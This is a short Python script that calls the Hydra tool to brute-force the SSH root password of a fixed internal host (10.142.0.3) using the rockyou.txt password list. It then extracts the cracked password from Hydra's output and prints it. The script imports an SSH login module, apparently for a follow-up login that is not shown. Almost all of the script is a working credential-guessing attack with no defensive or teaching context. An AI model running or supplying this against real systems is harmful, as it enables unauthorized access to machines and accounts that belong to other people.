from pexpect import pxssh
import subprocess
import numpy as np
import get_lan_ip
import re
output = subprocess.Popen(['hydra', '-l', 'root', '-P', 'rockyou.txt', '-t', '4', '10.142.0.3','ssh'], stdout = subprocess.PIPE)
response = output.communicate()[0]
password = response.split("password: ", 1)[1]
passwd = password.split("\n",1)[0]
print("password is "+passwd)

